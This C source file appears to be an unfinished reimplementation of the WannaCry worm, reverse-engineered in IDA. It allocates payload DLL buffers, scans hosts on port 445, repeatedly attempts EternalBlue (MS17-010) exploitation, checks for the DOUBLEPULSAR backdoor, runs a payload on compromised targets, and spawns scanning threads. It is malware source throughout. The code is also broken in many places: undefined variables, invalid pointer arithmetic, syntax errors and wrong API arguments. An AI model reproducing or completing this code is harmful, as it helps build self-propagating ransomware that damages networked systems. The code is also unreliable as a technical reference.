//https://blog.malwarebytes.com/threat-analysis/2017/05/the-worm-that-spreads-wanacrypt0r/
//skeleton code at this moment
//still a work in progress
//EXE file global here
volatile HGLOBAL hDLL_x86;
volatile HGLOBAL hDLL_x64;

//init the DLL payload here
//read from Wannacry in IDA
//also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
//Memory alloc functions: https://www.tenouk.com/visualcplusmfc/visualcplusmfc20.html
HGLOBAL initialize_payload() {
    /*
    32-bit dll start address 0x40B020, size is 0x4060 bytes
    64-bit dll start address 0x40F080, size is 0xc8a4 bytes
    */
    DWORD NumberOfBytesRead;
    DWORD fileSize;
    //size = 0x4060 converted to decimal: 16480
    //Possibly -> GlobalAlloc(GPTR, 5298176)
    hDLL_x86 = GlobalAlloc(GMEM_ZEROINIT, 5298176);
    /* 0x50D000 found in IDA but most likely: 0x506000 for 32 bit */

    //size = 0xc8a4 converted to decimal: 51364
    //Possibly -> GlobalAlloc(GPTR, 5298176)
    hDLL_x64 = GlobalAlloc(GMEM_ZEROINIT, 5298176); //0x50D000 found in IDA

    //if no errors continue
    if (hDLL_x86 || hDLL_x64) {
        //GENERIC_READ is 0x80000000 and GENERIC_WRITE is 0x40000000
        HANDLE fileHandle = CreateFileA(Filename, 0x80000000, 1, NULL, 3, 4, NULL);
        if (fileHandle != INVALID_HANDLE_VALUE) {
            fileSize = GetFileSize(fileHandle, NULL);
            *(DWORD*)hDLL_x86 + 0x4060 = fileSize; //Dword length written in x86 DLL buffer
            *(DWORD*)hDLL_x64 + 0xc8a4 = fileSize; //Dword length written in x64 DLL buffer
            ReadFile(fileHandle, hDLL_x86 + 0x4060 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
            ReadFile(fileHandle, hDLL_x64 + 0xc8a4 + sizeof(DWORD), &fileSize, &NumberOfBytesRead, 0);
            CloseHandle(fileHandle);
        }
    } else {
        GlobalFree(hMemory_x86);
        GlobalFree(hMemory_x64);
    }
}

// This function checks if a connection can be established on port 445 of the specified IP address
// Returns 1 if connection can be established, 0 otherwise
int canConnectToPort445(const char* ip) {
	// Create and initialize sockaddr_in struct with IP address and port number
	struct sockaddr_in name;
	name.sin_family = AF_INET;
	name.sin_addr.s_addr = inet_addr(ip);
	name.sin_port = htons(445);

	// Create a TCP socket to attempt connection on
	SOCKET control_sock;
	if ((control_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
		// Return 0 if socket creation fails
		return 0;
	}

	// Set socket to non-blocking mode
	u_long argp;
	ioctlsocket(control_sock, FIONBIO, &argp);

	// Initialize a set of write file descriptors to check if socket is writable
	fd_set writefds;
	FD_ZERO(&writefds);
	FD_SET(control_sock, &writefds);

	// Set timeout value for select() function
	struct timeval timeout;
	timeout.tv_sec = 1;
	timeout.tv_usec = 0;

	// Attempt connection to specified IP address and port
	if (connect(control_sock, (struct sockaddr*)&name, sizeof(name)) == -1) {
		// Connection failed, return 0
		closesocket(control_sock);
		return 0;
	}

	// Connection successful, close socket and return result of select() function
	closesocket(control_sock);
	return select(0, NULL, &writefds, NULL, &timeout);
}

DWORD MS17_010(DWORD LPPARAM) {
    struct in_addr target; // fix variable name and specify the type of target
    memset(&target, 0, sizeof(target)); // initialize target
    int attemptCount = 0; // initialize attemptCount
    // Check if the target is vulnerable to MS17-010 exploit
    if (CheckForEternalBlue(&target, 445)) {
        do {
            Sleep(3000); // wait for 3 seconds before checking for DOUBLEPULSAR
            if (IsDOUBLEPULSARInstalled(&target, 1, 445))
                break;
            Sleep(3000); // wait for 3 seconds before trying EternalBlue exploit again
            // Exploit the target using EternalBlue
            EternalBluePwn(&target, 445);
            ++attemptCount;
        } while (attemptCount < 5);
    }
    Sleep(3000); // wait for 3 seconds before checking for DOUBLEPULSAR again
    // Check if DOUBLEPULSAR is installed on the target
    if (IsDOUBLEPULSARInstalled(&target, 1, 445)) {
        // Run the payload on the target
        runPayloadOnTarget(&target, 1, 445);
    }
    // End the thread
    endthreadex(0);
    return 0;
}

int scanIP(DWORD LPPARAM) {
    HANDLE ExploitHandle;
    if (canConnectToPort445(target) > 0) {
        ExploitHandle = (HANDLE)_beginthreadex(NULL, MS17_010, (DWORD)LPPARAM, 0, 0);
        //Not sure if the if statement is needed but we'll keep it here for now
        if (ExploitHandle) {
            if (WaitForSingleObject(ExploitHandle, 60000) == 258))
            {
                TerminateThread(ExploitHandle, 0);
                CloseHandle(ExploitHandle);
            }
        }
    }
    endthreadex(0);
    return 0;
}

/*
Threading: https://www.bogotobogo.com/cplusplus/multithreaded2A.php
http://simplesamples.info/windows/_beginthreadex.aspx
https://jeffpar.github.io/kbarchive/kb/132/Q132078/
https://www.programmersought.com/article/57053139965/
https://sodocumentation.net/winapi/topic/1756/process-and-thread-management
*/
int threadMain() {
    //GetTargets(Char1, Char2);

    HANDLE ScanIPMain;
    //create 100 threads
    ScanIPMain = (HANDLE)_beginthreadex(0, 0, scanIP, v1[i], 0, 0);
}
